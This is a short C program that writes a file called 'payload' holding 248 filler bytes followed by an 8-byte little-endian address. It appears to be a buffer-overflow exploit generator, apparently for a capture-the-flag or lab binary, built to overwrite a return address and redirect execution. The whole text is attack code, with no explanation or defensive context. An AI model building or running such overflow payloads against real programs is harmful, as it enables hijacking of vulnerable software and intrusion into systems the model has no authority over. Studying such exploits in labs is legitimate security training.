#include<stdio.h>
int main(){
    FILE* f=fopen("payload","wb");
    for(int i=0;i<248;i++){
        fputc('a',f);
    }
    unsigned char address[]={0xe8,0x04,0x01,0x00,0x00,0x00,0x00,0x00,0x00};
    fwrite(address,sizeof(unsigned char),8,f);
    fclose(f);
    return 0;
}